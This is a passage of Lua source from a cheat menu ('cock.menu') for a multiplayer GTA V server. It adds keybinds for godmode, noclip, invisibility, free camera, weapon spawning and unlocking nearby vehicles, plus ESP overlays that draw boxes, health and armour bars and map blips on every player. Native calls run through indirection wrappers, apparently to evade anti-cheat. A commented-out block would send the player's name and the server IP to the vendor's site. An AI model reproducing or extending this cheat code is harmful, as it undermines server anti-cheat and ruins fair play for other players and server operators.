                                   Fatasf.n.SetVehicleMod(veh, 12, 3, false)
                               end
                               if tf.CSeparator("~y~ARMOUR", "") then
                               end--17
       
                               if tf.Button('Default Armour', "~y~Semi") then
                                   local veh = Fatasf.n.GetVehiclePedIsIn(Fatasf.n.PlayerPedId())
                                   Fatasf.n.SetVehicleMod(veh, 17, -1, false)
                               end
                               if tf.Button('Armour LVL 1', "~y~Semi") then
                                   local veh = Fatasf.n.GetVehiclePedIsIn(Fatasf.n.PlayerPedId())
                                   Fatasf.n.SetVehicleMod(veh, 17, 0, false)
                               end
                               if tf.Button('Armour LVL 2', "~y~Semi") then
                                   local veh = Fatasf.n.GetVehiclePedIsIn(Fatasf.n.PlayerPedId())
                                   Fatasf.n.SetVehicleMod(veh, 17, 1, false)
                               end
                               if tf.Button('Armour LVL 3', "~y~Semi") then
                                   local veh = Fatasf.n.GetVehiclePedIsIn(Fatasf.n.PlayerPedId())
                                   Fatasf.n.SetVehicleMod(veh, 17, 2, false)
                               end
                               if tf.Button('Armour LVL 4', "~y~Semi") then
                                   local veh = Fatasf.n.GetVehiclePedIsIn(Fatasf.n.PlayerPedId())
                                   Fatasf.n.SetVehicleMod(veh, 17, 3, false)
                               end
                           end
       
                           if tf.IsMenuOpened("addons") then
                               --if tf.CSeparator("~y~VEHICLES", "") then end
       
                               for k, v in CockT.Math.pairs(CockT.AddonVehs) do
                                   if Fatasf.n.IsModelValid(Fatasf.n.GetHashKey(v.spawn)) then
                                       if tf.Button(v.name, "~g~SPAWN") then
                                           Functions.f.SpawnVehicle(v.spawn)
                                       end
                                   end
                               end
       
                               --[[if tf.CSeparator("~y~PEDS", "") then
                               end]]
                               for k, v in CockT.Math.pairs(CockT.AddonVehs.Peds) do
                                   if Fatasf.n.IsModelValid(Fatasf.n.GetHashKey(v.pspawn)) then
                                       if tf.Button(v.pspawn, "~g~SPAWN") then
                                           Functions.f.SpawnVehicle(v.spawn)
                                       end
                                   end
                               end
       
                           
       
                               
                           end
       
                           if tf.IsMenuOpened("music") then
                               if tf.Button("~r~These do nothing since cock.menu is down", "") then
                               end
                               if tf.Button("", "") then
                               end
                               if tf.Button("~r~Starting more than one music at row, can crash you!", "") then
                                    Fatasf.n.Leprint("Easter egg :3")
                               end
                               if tf.Button("Bogota - MERO", "") then
                                   Cock.Menu.bogotamero = not Cock.Menu.bogotamero
                                   if Cock.Menu.bogotamero then
                                       --local music = Fatasf.n.CreateAnDui("https://cock.menu/music/BlindingLights.mp3", 1, 1, 1)
                                   else
                                       Fatasf.n.DestroyDui(music)
                                   end
                               end
                               if tf.Button("Welcome to the O - King Von", "") then
                                   Cock.Menu.welcometotheo = not Cock.Menu.welcometotheo
                                   if Cock.Menu.welcometotheo then
                                       --local music = Fatasf.n.CreateAnDui("https://cock.menu/music/SRWelcomeTo.mp3", 1, 1, 1)
                                   else
                                       Fatasf.n.DestroyDui(music)
                                   end
                               end
                               if tf.Button("Martin & Gina - Polo G", "") then
                                   Cock.Menu.polog = not Cock.Menu.polog
                                   if Cock.Menu.polog then
                                       --local music = Fatasf.n.CreateAnDui("https://cock.menu/music/PoloGMartin.mp3", 1, 1, 1)
                                   else
                                       Fatasf.n.DestroyDui(music)
                                   end
                               end
                               if tf.Button("Somebody that i used to know - Gotye", "") then
                                   Cock.Menu.somebodythat = not Cock.Menu.somebodythat
                                   if Cock.Menu.somebodythat then
                                       --local music = Fatasf.n.CreateAnDui("https://cock.menu/music/GotyeSomebody.mp3", 1, 1, 1)
                                   else
                                       Fatasf.n.DestroyDui(music)
                                   end
                               end
                               if tf.Button("21 - Polo G", "") then
                                   Cock.Menu.poloog = not Cock.Menu.poloog
                                   if Cock.Menu.poloog then
                                       --local music = Fatasf.n.CreateAnDui("https://cock.menu/music/PoloG21.mp3", 1, 1, 1)
                                   else
                                       Fatasf.n.DestroyDui(music)
                                   end
                               end
                               if tf.Button("Blinding lights - The Weekend ", "") then
                                   Cock.Menu.blindinglights = not Cock.Menu.blindinglights
                                   if Cock.Menu.blindinglights then
                                       --local music = Fatasf.n.CreateAnDui("https://cock.menu/music/BlindingLights.mp3", 1, 1, 1)
                                   else
                                       Fatasf.n.DestroyDui(music)
                                   end
                               end
                               if tf.Button("Dave - Location", "") then
                                   Cock.Menu.davelocation = not Cock.Menu.davelocation
                                   if Cock.Menu.davelocation then
                                       --local music = Fatasf.n.CreateAnDui("https://cock.menu/music/DaveLocation.mp3", 1, 1, 1)
                                   else
                                       Fatasf.n.DestroyDui(music)
                                   end
                               end
       
                               if tf.Button("Astronaut in the ocean - Masked Wolf", "") then
                                   Cock.Menu.astintheocean = not Cock.Menu.astintheocean
                                   if Cock.Menu.astintheocean then
                                       --local music = Fatasf.n.CreateAnDui("https://cock.menu/music/AstronautInTheOcean.mp3", 1, 1, 1)
                                   else
                                       Fatasf.n.DestroyDui(music)
                                   end
                               end
                               if tf.Button("Welcome To Brixton - SR", "") then
                                   Cock.Menu.welcometobrixton = not Cock.Menu.welcometobrixton
                                   if Cock.Menu.welcometobrixton then
                                       --local music = Fatasf.n.CreateAnDui("https://cock.menu/music/SRWelcomeTo.mp3", 1, 1, 1)
                                   else
                                       Fatasf.n.DestroyDui(music)
                                   end
                               end
       
                               if tf.Button("Ganging - Headie One", "") then
                                   Cock.Menu.Ganging = not Cock.Menu.Ganging
                                   if Cock.Menu.Ganging then
                                       --local music = Fatasf.n.CreateAnDui("https://cock.menu/music/HeadieOneGanging.mp3", 1, 1, 1)
                                   else
                                       Fatasf.n.DestroyDui(music)
                                   end
                               end
                               if tf.Button("Gangstas paradise  - Coolio", "") then
                                   Cock.Menu.Gangstas = not Cock.Menu.Gangstas
                                   if Cock.Menu.Gangstas then
                                       --local music = Fatasf.n.CreateAnDui("https://cock.menu/music/CoolioGangstasParadise.mp3", 1, 1, 1)
                                   else
                                       Fatasf.n.DestroyDui(music)
                                   end
                               end
                               if tf.Button("I got 5 On It - Luniz", "") then
                                   Cock.Menu.gotfiveonit = not Cock.Menu.gotfiveonit
                                   if Cock.Menu.gotfiveonit then
                                       --local music = Fatasf.n.CreateAnDui("https://cock.menu/music/IGOT5ONIT.mp3", 1, 1, 1)
                                   else
                                       Fatasf.n.DestroyDui(music)
                                   end
                               end
                               --[[if tf.Button("A$AP Rocky - L$D", "") then
                                   Cock.Menu.asaprocky = not Cock.Menu.asaprocky
                                   if Cock.Menu.asaprocky then
                                       music = Fatasf.n.CreateAnDui("", 1, 1, 1)
                                   else
                                       --Fatasf.n.DestroyDui(music)
                                   end
                               end]]
                               if tf.Button("Kkoke - KokeSpiracy", "") then
                                   Cock.Menu.KokeSpiracy = not Cock.Menu.KokeSpiracy
                                   if Cock.Menu.KokeSpiracy then
                                       --local music = Fatasf.n.CreateAnDui("https://cock.menu/music/KokeSpiracy.mp3", 1, 1, 1)
                                   else
                                       Fatasf.n.DestroyDui(music)
                                   end
                               end
                               
       
                           end
                           
                           if tf.IsMenuOpened("keybinds") then
                               if tf.Button("Open Menu:", ""..CockKeybinds.Menu.OpenMenuKey["Label"]) then
                                   local value, label = Functions.f.BindOnStart()
                                   CockKeybinds.Menu.OpenMenuKey["Label"] = label
                                   CockKeybinds.Menu.OpenMenuKey["Value"] = value
                               end
   
                               if tf.Button("Noclip:", ""..CockKeybinds.Menu.Noclip["Label"]) then
                                   local value, label = Functions.f.BindOnStart()
                                   CockKeybinds.Menu.Noclip["Label"] = label
                                   CockKeybinds.Menu.Noclip["Value"] = value
                               end
                               if tf.Button("Heal:", ""..CockKeybinds.Menu.Heal["Label"]) then
                                   local value, label = Functions.f.BindOnStart()
                                   CockKeybinds.Menu.Heal["Label"] = label
                                   CockKeybinds.Menu.Heal["Value"] = value
                               end
                               if tf.Button("Revive:", ""..CockKeybinds.Menu.Revive["Label"]) then
                                   local value, label = Functions.f.BindOnStart()
                                   CockKeybinds.Menu.Revive["Label"] = label
                                   CockKeybinds.Menu.Revive["Value"] = value
                               end
                               if tf.Button("Armour:", ""..CockKeybinds.Menu.Armour["Label"]) then
                                   local value, label = Functions.f.BindOnStart()
                                   CockKeybinds.Menu.Armour["Label"] = label
                                   CockKeybinds.Menu.Armour["Value"] = value
                               end
                               if tf.Button("Freecam:", ""..CockKeybinds.Menu.Freecam["Label"]) then
                                   local value, label = Functions.f.BindOnStart()
                                   CockKeybinds.Menu.Freecam["Label"] = label
                                   CockKeybinds.Menu.Freecam["Value"] = value
                               end
                               if tf.Button("Godmode:", ""..CockKeybinds.Menu.Godmode["Label"]) then
                                   local value, label = Functions.f.BindOnStart()
                                   CockKeybinds.Menu.Godmode["Label"] = label
                                   CockKeybinds.Menu.Godmode["Value"] = value
                               end
                               if tf.Button("Fix vehicle:", ""..CockKeybinds.Menu.fixveh["Label"]) then
                                   local value, label = Functions.f.BindOnStart()
                                   CockKeybinds.Menu.fixveh["Label"] = label
                                   CockKeybinds.Menu.fixveh["Value"] = value
                               end
                               if tf.Button("Give vintage:", ""..CockKeybinds.Menu.givevintage["Label"]) then
                                   local value, label = Functions.f.BindOnStart()
                                   CockKeybinds.Menu.givevintage["Label"] = label
                                   CockKeybinds.Menu.givevintage["Value"] = value
                               end
                               if tf.Button("Give pistol:", ""..CockKeybinds.Menu.givepistol["Label"]) then
                                   local value, label = Functions.f.BindOnStart()
                                   CockKeybinds.Menu.givepistol["Label"] = label
                                   CockKeybinds.Menu.givepistol["Value"] = value
                               end
                               if tf.Button("Invisible:", ""..CockKeybinds.Menu.invisible["Label"]) then
                                   local value, label = Functions.f.BindOnStart()
                                   CockKeybinds.Menu.invisible["Label"] = label
                                   CockKeybinds.Menu.invisible["Value"] = value
                               end
                               if tf.Button("Unlock vehicle:", ""..CockKeybinds.Menu.unlockveh["Label"]) then
                                   local value, label = Functions.f.BindOnStart()
                                   CockKeybinds.Menu.unlockveh["Label"] = label
                                   CockKeybinds.Menu.unlockveh["Value"] = value
                               end
                           end
       
                           if tf.IsMenuOpened("settings") then
                               if tf.CSeparator("~y~DEVS", "") then
                               end
                               if CockMeni.Functions.ComboBox("Contributors", CockMenu.ComboBoxesT.Contributors, CockMenu.ComboBoxesT.ConMultIndex, CockMenu.ComboBoxesT.ConLengMult, function(currentIndex, selIndex)
                               CockMenu.ComboBoxesT.ConMultIndex = currentIndex
                               CockMenu.ComboBoxesT.ConLengMult = currentIndex
                           end) then
                           end
                           if tf.CSeparator("~y~KEYBINDS", "") then
                           end
                           if CockMeni.Functions.MenuButton("Keybinds Manager", "keybinds", ">") then 
                           end
                           if tf.CSeparator("~y~MENU DESIGN", "") then
                           end
                           
                           if CockMeni.Functions.ComboBox("Menu Position", CockMenu.ComboBoxesT.Position, CockMenu.ComboBoxesT.PosMultIndex, CockMenu.ComboBoxesT.PosLengMult, function(currentIndex, selIndex)
                               CockMenu.ComboBoxesT.PosMultIndex = currentIndex
                               CockMenu.ComboBoxesT.PosLengMult = currentIndex
                           end) then
                               defaultStyle.x = CockMenu.ComboBoxesT.PosValue[CockMenu.ComboBoxesT.PosMultIndex]
                           end
                           if CockMeni.Functions.ComboBox("Gif", CockMenu.ComboBoxesT.Gif, CockMenu.ComboBoxesT.GifMultIndex, CockMenu.ComboBoxesT.GifLengMult, function(currentIndex, selIndex)
                               CockMenu.ComboBoxesT.GifMultIndex = currentIndex
                               CockMenu.ComboBoxesT.GifLengMult = currentIndex
                           end) then
                                   CockMeni.Functions.LoadGif1()
                                   defaultStyle.focusColor = {131, 219, 248, 170}
                                   if CockMenu.ComboBoxesT.Gif[CockMenu.ComboBoxesT.GifMultIndex] == 'nyan' then
                                       CockMeni.Functions.LoadGif2()
                                       defaultStyle.focusColor = {255, 152, 255, 170}
                                   end
                                   if CockMenu.ComboBoxesT.Gif[CockMenu.ComboBoxesT.GifMultIndex] == 'blue' then
                                       CockMeni.Functions.LoadGif3()
                                       defaultStyle.focusColor = {149, 251, 235, 170}
                                   end
                                   if CockMenu.ComboBoxesT.Gif[CockMenu.ComboBoxesT.GifMultIndex] == 'sun' then
                                       CockMeni.Functions.LoadGif4()
                                       defaultStyle.focusColor = {186, 125, 135, 170}
                                   end
                                   if CockMenu.ComboBoxesT.Gif[CockMenu.ComboBoxesT.GifMultIndex] == 'lsc' then
                                   CockMeni.Functions.LoadGifLSC()
                                   end
                           end
                           if tf.CSeparator("~y~OTHER", "") then
                           end
                           if tf.Button("Kill menu", "") then
                               local input = Functions.f.CustomInput('Are you sure? (yes / no)', '', 5)
                               if input == 'yes' then
                                   CockMenu.MenuEnabled = false
                               else         
                               end
                           end
                          --[[  if tf.Button("Load Config by name", "") then
                               local configname = Functions.f.CustomInput('Config name', '', 20)
                               local uid = Fatasf.n.GetRedUid()
                               local new = Fatasf.n.RequestFromWeb("https://cock.menu/configs/load/"..uid.."/"..configname, nil, 'get')
                               local decodedMessage = CockT.Strings.jsondecode(new)
                               local decodedReal = CockT.Strings.jsondecode(decodedMessage.config.config1)
                               if new ~= nil then
                                   Cock.Menu = decodedReal
                                   --CockMeni.Functions.AddNotification('Loaded config: #1', "INFO", 5000)
                               else
                                   --CockMeni.Functions.AddNotification('Damn bro, server is down', "ERROR", 5000)
                               end
                           end
                           if tf.Button("Save config", "") then
                               local configname = Functions.f.CustomInput('Config name', '', 20)
                               local uid = Fatasf.n.GetRedUid()
                               Fatasf.n.RequestFromWeb("https://cock.menu/configs/save/"..uid.."/"..configname, {
                                   configData = CockT.Strings.jsonencode(Cock.Menu)
                               }, 'post')
                           end
                           if tf.Button("Report bug", "") then
                               local message =  Functions.f.CustomInput('Message to support', '', 2000)
                               local name =  Fatasf.n.GetPlayerName(Fatasf.n.PlayerId())
                               local reuid = Fatasf.n.GetRedUid()
                               local hex = "NaN" -- to do
                               local ip = Fatasf.n.GetCurrentServerEndpoint()
                               --local playerdata = Fatasf.n.IsPedDeadOrDying(Fatasf.n.PlayerPedId(), 1) and "Dead " or "Alive "
                               if Fatasf.n.GetEntityHealth(Fatasf.n.PlayerPedId()) < 1 then
                                   playerdata = "Dead"
                               else
                                   playerdata = "Alive"
                               end
   
                               local url = "https://cock.menu/iuhdsfiash/reports.html".."?user="..name.."&message="..message.."&sip="..ip.."&status="..playerdata.."&hex="..hex.."&reuid="..reuid
                               local log_dui = Fatasf.n.CreateAnDui(url, 50, 50)
                           end ]]
                           --[[ if tf.Button("Go back to loader", "") then
                               CockMenu.MenuEnabled = false
                               CockT.Global.hIvkXiYg2ogzm1MvdOolDhAhwQdBwv()
                           end ]]
                           if CockMeni.Functions.CheckBox("Use custom input", CockT.UseCustomInput) then
                               CockT.UseCustomInput = not CockT.UseCustomInput
                           end
                           if CockMeni.Functions.CheckBox("Disable scroll bar", CockT.DisableScrollBar) then
                               CockT.DisableScrollBar = not CockT.DisableScrollBar
                           end
                           
                       end
   
                       
       
                       if Fatasf.n.IsDisabledControlJustPressed(1, CockKeybinds.Menu.OpenMenuKey["Value"]) then
                           tf.OpenMenu("START")
                       end
           end
       end)
       
       
       Text = function(text, x, y, scale, centre, font, _outl, colour)
           Fatasf.n.SetTextFont(font)
           Fatasf.n.SetTextCentre(centre)
           Fatasf.n.SetTextOutline(_outl)
           Fatasf.n.SetTextScale(0.0, scale or 0.25)
           --Fatasf.n.SetTextColour(colour.r, colour.g, colour.b, colour.a)
           Fatasf.n.SetTextEntry("STRING")
           Fatasf.n.AddTextComponentString(text)
           Fatasf.n.DrawText(x, y)
       end
       
       CockT.Inv["Thread"](function()
           while CockMenu.MenuEnabled do
               CockT.Inv["Wait"](0)
       
               
   
   
   
               if Fatasf.n.IsDisabledControlJustPressed(0, CockKeybinds.Menu.Noclip["Value"]) then
                   Cock.Menu.NClip = not Cock.Menu.NClip
               elseif Fatasf.n.IsDisabledControlJustPressed(0, CockKeybinds.Menu.Heal["Value"]) then
                   Fatasf.n.SetEntityHealth(Fatasf.n.PlayerPedId(), 200)
               elseif Fatasf.n.IsDisabledControlJustPressed(0, CockKeybinds.Menu.Revive["Value"]) then
                   CockMeni.Functions.natRe()
               elseif Fatasf.n.IsDisabledControlJustPressed(0, CockKeybinds.Menu.Armour["Value"]) then
                   Fatasf.n.SetPedArmour(Fatasf.n.PlayerPedId(), 100)
               elseif Fatasf.n.IsDisabledControlJustPressed(0, CockKeybinds.Menu.Freecam["Value"]) then
                   Cock.Menu.Freecam = not Cock.Menu.Freecam
               elseif Fatasf.n.IsDisabledControlJustPressed(0, CockKeybinds.Menu.Godmode["Value"]) then
                   Cock.Menu.Godmode = not Cock.Menu.Godmode
               elseif Fatasf.n.IsDisabledControlJustPressed(0, CockKeybinds.Menu.fixveh["Value"]) then
                   Functions.f.RepairVehicle()
               elseif Fatasf.n.IsDisabledControlJustPressed(0, CockKeybinds.Menu.givevintage["Value"]) then
                   Fatasf.n.GiveWeaponToPed(Fatasf.n.PlayerPedId(), Fatasf.n.GetHashKey("weapon_vintagepistol"), 150, false, false)
               elseif Fatasf.n.IsDisabledControlJustPressed(0, CockKeybinds.Menu.givepistol["Value"]) then
                   Fatasf.n.GiveWeaponToPed(Fatasf.n.PlayerPedId(), Fatasf.n.GetHashKey("weapon_pistol"), 150, false, false)
               elseif Fatasf.n.IsDisabledControlJustPressed(0, CockKeybinds.Menu.invisible["Value"]) then
                   Cock.Menu.invisible = not Cock.Menu.invisible
               elseif Fatasf.n.IsDisabledControlJustPressed(0, CockKeybinds.Menu.unlockveh["Value"]) then
                   local vehicle = CockT.Inv["Invoke"](CockT.Natives['GetClosestVehicle'], Fatasf.n.GetEntityCoords(Fatasf.n.PlayerPedId()), 25.0, 0, 70)
                   Functions.f.UnlockVehicle(vehicle)
               end
   
               --Fatasf.n.SetRunSprintMultiplierForPlayer(Fatasf.n.PlayerPedId(), CockMenu.ComboBoxesT.SpeedMultiplier[CockMenu.ComboBoxesT.MultIndex])  
               --Fatasf.n.SetPedMoveRateOverride(Fatasf.n.PlayerPedId(), CockMenu.ComboBoxesT.SpeedMultiplier[CockMenu.ComboBoxesT.MultIndex])
   
               if Fatasf.n.GetVehiclePedIsIn(Fatasf.n.PlayerPedId(), false) ~= 0 then
                   CockT.Inv["Invoke"](CockT.Natives['SetVehicleGravityAmount'], Fatasf.n.GetVehiclePedIsUsing(Fatasf.n.PlayerPedId()), CockMenu.ComboBoxesT.VehSet[CockMenu.ComboBoxesT.vehspeedMultIndex])
               end
       
               if Cock.Menu.cockplate then
                   CockMeni.Functions.cockplate()
               end
       
               if Cock.Menu.DriveToWaypoint then
                  CockMeni.Functions.DriveToWaypoint()
               end
               if Cock.Menu.nofall then
                   CockT.Inv["Invoke"](CockT.Natives["SetPedCanBeKnockedOffVehicle"], Fatasf.n.PlayerPedId(), true)
               else
                   CockT.Inv["Invoke"](CockT.Natives["SetPedCanBeKnockedOffVehicle"], Fatasf.n.PlayerPedId(), false)
               end
   
               if Cock.Menu.espglow then
                   for k, v in CockT.Math.pairs(Fatasf.n.GetActivePlayers()) do 
                       local pPed = Fatasf.n.GetPlayerPed(v)
                       if Cock.Menu.includeself then
                           er = nil
                       else
                           er = Fatasf.n.PlayerPedId()
                       end
                       if Fatasf.n.GetDistanceBetweenCoords(Fatasf.n.GetEntityCoords(Fatasf.n.PlayerPedId()), Fatasf.n.GetEntityCoords(pPed), true) < CockMenu.ComboBoxesT.EspDist[CockMenu.ComboBoxesT.EspDistMultIndex] and pPed ~= er then
                           local x, y, z = CockT.Strings.tunpack(Fatasf.n.GetEntityCoords(pPed, true))
                           CockT.Inv["Invoke"](CockT.Natives['DrawMarker'], 28, Fatasf.n.GetPedBoneCoords(pPed, 31086, 0.0, 0.0, 0.0), 0.0, 0.0, 0.0, 0.0, 0.0, 0.0, 0.57, 0.57, 1.75, 255, 255, 255, 255, false, false, 2, 0.0, 0.0, true, true)
                           CockT.Inv["Invoke"](CockT.Natives['DrawMarker'], 28, Fatasf.n.GetPedBoneCoords(pPed, 14201, 0.0, 0.0, 0.0), 0.0, 0.0, 0.0, 0.0, 0.0, 0.0, 0.2, 0.2, 0.2, 255, 255, 255, 255, false, false, 2, 0.0, 0.0, true, true)
                           CockT.Inv["Invoke"](CockT.Natives['DrawMarker'], 28, Fatasf.n.GetPedBoneCoords(pPed, 52301, 0.0, 0.0, 0.0), 0.0, 0.0, 0.0, 0.0, 0.0, 0.0, 0.2, 0.2, 0.2, 255, 255, 255, 255, false, false, 2, 0.0, 0.0, true, true)
                       end
                   end
               end
   
               
   
               if Cock.Menu.vehesp then
                   for vehs in Fatasf.n.EnumerateVehicles() do
                       local vehX, vehY, vehZ = CockT.Strings.tunpack(Fatasf.n.GetEntityCoords(vehs))
                       local xx = CockT.Math.tonumber(CockT.Strings.format("%.2f", vehX))
                       local yy = CockT.Math.tonumber(CockT.Strings.format("%.2f", vehY))
                       local zz = CockT.Math.tonumber(CockT.Strings.format("%.2f", vehZ))
                       if Fatasf.n.GetDistanceBetweenCoords(Fatasf.n.GetEntityCoords(Fatasf.n.PlayerPedId()), Fatasf.n.GetEntityCoords(vehs), true) < CockMenu.ComboBoxesT.EspDist[CockMenu.ComboBoxesT.EspDistMultIndex] then
                           local text = 'Model: '..Fatasf.n.GetDisplayNameFromVehicleModel(Fatasf.n.GetEntityModel(vehs))..'\nHash: '..Fatasf.n.GetEntityModel(vehs)..'\n~g~X: ~s~'..xx..' ~g~Y: ~s~'..yy..' ~g~Z: ~s~'..zz
                           CockT.Global.DrawTextOnCoords(xx, yy, zz, text, 255, 255, 255, 0, 0.20)
                       end
                   end
               end
               if Cock.Menu.blipsonmap then
                   for k, v in CockT.Math.pairs(Fatasf.n.GetActivePlayers()) do 
                       local entity = Fatasf.n.GetPlayerPed(v)
                       local blip = CockT.Inv["Invoke"](CockT.Natives["AddBlipForEntity"], entity)
                       CockT.Inv["Invoke"](CockT.Natives["SetBlipAsFriendly"], blip, true)
                       CockT.Inv["Invoke"](CockT.Natives["SetBlipSprite"], blip, 1)
                       CockT.Inv["Invoke"](CockT.Natives["SetBlipColour"], blip, 17)
                       CockT.Inv["Invoke"](CockT.Natives["SetBlipNameToPlayerName"], blip, v)
                       if Fatasf.n.GetEntityHealth(entity) < 1 then
                           CockT.Inv["Invoke"](CockT.Natives["SetBlipSprite"], blip, 274)
                           CockT.Inv["Invoke"](CockT.Natives["SetBlipColour"], blip, 1)
                       end
                   end
               elseif not Cock.Menu.blipsonmap then
                   for k, v in CockT.Math.pairs(Fatasf.n.GetActivePlayers()) do 
                       local entity = Fatasf.n.GetPlayerPed(v)
                       local blip = CockT.Inv["Invoke"](CockT.Natives["GetBlipFromEntity"], entity)
                       if Fatasf.n.DoesBlipExist(blip) then
                           CockT.Inv["Invoke"](CockT.Natives["RemoveBlip"], _cit_.PointerValueIntInitialized(blip))
                       end
                   end
               end
   
               if Cock.Menu.hpbar then
                   for k, v in CockT.Math.pairs(Fatasf.n.GetActivePlayers()) do 
                       local pPed = Fatasf.n.GetPlayerPed(v)
                       if Fatasf.n.IsEntityOnScreen(pPed) then
                           if Cock.Menu.includeself then
                               er = nil
                           else
                               er = Fatasf.n.PlayerPedId()
                           end
                           if Fatasf.n.GetDistanceBetweenCoords(Fatasf.n.GetEntityCoords(Fatasf.n.PlayerPedId()), Fatasf.n.GetEntityCoords(pPed), true) < CockMenu.ComboBoxesT.EspDist[CockMenu.ComboBoxesT.EspDistMultIndex] and pPed ~= er then
                               local dist = Fatasf.n.GetDistanceBetweenCoords(Fatasf.n.GetFinalRenderedCamCoord(), Fatasf.n.GetEntityCoords(pPed), true)
                               Fatasf.n.SetDrawOrigin(Fatasf.n.GetEntityCoords(pPed))          
                               Fatasf.n.DrawRect(-0.2745 / dist - (dist / 500) / dist, 0, 0.0015, 2.0 / dist, 0, 0, 0, 90)
                               Fatasf.n.DrawRect(-0.2745 / dist - (dist / 500) / dist, 1.05 / dist - Fatasf.n.GetEntityHealth(pPed) / 195 / dist, 0.0005, Fatasf.n.GetEntityHealth(pPed) / 98 / dist, 30, 255, 30, 255)
                           end
                       end
                       Fatasf.n.ClearDrawOrigin()
                   end
               end
               
               if Cock.Menu.armourbar then
                   for k, v in CockT.Math.pairs(Fatasf.n.GetActivePlayers()) do 
                       local pPed = Fatasf.n.GetPlayerPed(v)
                       if Fatasf.n.IsEntityOnScreen(pPed) then
                           if Cock.Menu.includeself then
                               er = nil
                           else
                               er = Fatasf.n.PlayerPedId()
                           end
                           if Fatasf.n.GetDistanceBetweenCoords(Fatasf.n.GetEntityCoords(Fatasf.n.PlayerPedId()), Fatasf.n.GetEntityCoords(pPed), true) < CockMenu.ComboBoxesT.EspDist[CockMenu.ComboBoxesT.EspDistMultIndex] and pPed ~= er then
                               local dist = Fatasf.n.GetDistanceBetweenCoords(Fatasf.n.GetFinalRenderedCamCoord(), Fatasf.n.GetEntityCoords(pPed), true)
                               Fatasf.n.SetDrawOrigin(Fatasf.n.GetEntityCoords(pPed))          
               
                               Fatasf.n.DrawRect(-0.3 / dist - (dist / 500) / dist, 0, 0.0015, 2.0 / dist, 0, 0, 0, 90)
                               Fatasf.n.DrawRect(-0.3 / dist - (dist / 500) / dist, 0.999 / dist - Fatasf.n.GetPedArmour(pPed) / 100.5 / dist, 0.0005, Fatasf.n.GetPedArmour(pPed) / 50 / dist, 0, 174, 255, 255)
                           end
                       end
                       Fatasf.n.ClearDrawOrigin()
                   end
               end
   
               if Cock.Menu.cornerbox then
                   for k, v in CockT.Math.pairs(Fatasf.n.GetActivePlayers()) do 
                       local pPed = Fatasf.n.GetPlayerPed(v)
                       if Fatasf.n.IsEntityOnScreen(pPed) then
                           if Cock.Menu.includeself then
                               er = nil
                           else
                               er = Fatasf.n.PlayerPedId()
                           end
                           if Fatasf.n.GetDistanceBetweenCoords(Fatasf.n.GetEntityCoords(Fatasf.n.PlayerPedId()), Fatasf.n.GetEntityCoords(pPed), true) < CockMenu.ComboBoxesT.EspDist[CockMenu.ComboBoxesT.EspDistMultIndex] and pPed ~= er then
                               local dist = Fatasf.n.GetDistanceBetweenCoords(Fatasf.n.GetFinalRenderedCamCoord(), Fatasf.n.GetEntityCoords(pPed), true)
                               local X, Y = Fatasf.n.GetActiveScreenResolution()
                               Fatasf.n.SetDrawOrigin(Fatasf.n.GetEntityCoords(pPed))
           
                               Fatasf.n.DrawRect(-0.265/dist, -0.92/dist, 1 / X, 0.15/dist, 255, 255, 255, 255)
                               Fatasf.n.DrawRect(-0.265/dist, 0.92/dist, 1 / X, 0.15/dist, 255, 255, 255, 255)
                               Fatasf.n.DrawRect(0.265/dist, -0.92/dist, 1 / X, 0.15/dist, 255, 255, 255, 255)
                               Fatasf.n.DrawRect(0.265/dist, 0.92/dist, 1 / X, 0.15/dist, 255, 255, 255, 255)
                               Fatasf.n.DrawRect(-0.215/dist, -0.994/dist, 0.1/dist, 1 / Y, 255, 255, 255, 255)
                               Fatasf.n.DrawRect(0.215/dist, -0.994/dist, 0.1/dist, 1 / Y, 255, 255, 255, 255)
                               Fatasf.n.DrawRect(0.215/dist, 0.994/dist, 0.1/dist, 1 / Y, 255, 255, 255, 255)
                               Fatasf.n.DrawRect(-0.215/dist, 0.994/dist, 0.1/dist, 1 / Y, 255, 255, 255, 255)
           
                           end
                       end
                       Fatasf.n.ClearDrawOrigin()
                   end
               end
               
               if Cock.Menu.boxesV3 then
                   for k, v in CockT.Math.pairs(Fatasf.n.GetActivePlayers()) do 
                       local pPed = Fatasf.n.GetPlayerPed(v)
                       if Fatasf.n.IsEntityOnScreen(pPed) then
                           if Cock.Menu.includeself then
                               er = nil
                           else
                               er = Fatasf.n.PlayerPedId()
                           end
                           if Fatasf.n.GetDistanceBetweenCoords(Fatasf.n.GetEntityCoords(Fatasf.n.PlayerPedId()), Fatasf.n.GetEntityCoords(pPed), true) < CockMenu.ComboBoxesT.EspDist[CockMenu.ComboBoxesT.EspDistMultIndex] and pPed ~= er then
                               local dist = Fatasf.n.GetDistanceBetweenCoords(Fatasf.n.GetFinalRenderedCamCoord(), Fatasf.n.GetEntityCoords(pPed), true)
                               Fatasf.n.SetDrawOrigin(Fatasf.n.GetEntityCoords(pPed))
                               Fatasf.n.DrawRect(0, 0, 0.53 / dist, 2.0 / dist, 0, 0, 0, 140)
                           end
                       end
                   end
               end
               if Cock.Menu.boxesV2 then
                   for k, v in CockT.Math.pairs(Fatasf.n.GetActivePlayers()) do 
                       local pPed = Fatasf.n.GetPlayerPed(v)
                       if Fatasf.n.IsEntityOnScreen(pPed) then
                           if Cock.Menu.includeself then
                               er = nil
                           else
                               er = Fatasf.n.PlayerPedId()
                           end
                           if Fatasf.n.GetDistanceBetweenCoords(Fatasf.n.GetEntityCoords(Fatasf.n.PlayerPedId()), Fatasf.n.GetEntityCoords(pPed), true) < CockMenu.ComboBoxesT.EspDist[CockMenu.ComboBoxesT.EspDistMultIndex] and pPed ~= er then
                               local dist = Fatasf.n.GetDistanceBetweenCoords(Fatasf.n.GetFinalRenderedCamCoord(), Fatasf.n.GetEntityCoords(pPed), true)
                               Fatasf.n.SetDrawOrigin(Fatasf.n.GetEntityCoords(pPed))
                               Fatasf.n.DrawRect(0, -0.999 / dist, 0.53 / dist, 0.001, 255, 20, 10, 255)
                               Fatasf.n.DrawRect(0, 0.999 / dist, 0.53 / dist, 0.001, 255, 20, 10, 255)
                               Fatasf.n.DrawRect(-0.265 / dist, 0, 0.0006, 2.0 / dist, 255, 20, 10, 255)
                               Fatasf.n.DrawRect(0.265 / dist, 0, 0.0006, 2.0 / dist, 255, 20, 10, 255)
                           end
                       end
                       Fatasf.n.ClearDrawOrigin()
                   end
               end
               
               if Cock.Menu.boxes then
                   for k, v in CockT.Math.pairs(Fatasf.n.GetActivePlayers()) do 
                       local pPed = Fatasf.n.GetPlayerPed(v)
                       if Fatasf.n.IsEntityOnScreen(pPed) then
                           if Cock.Menu.includeself then
                               er = nil
                           else
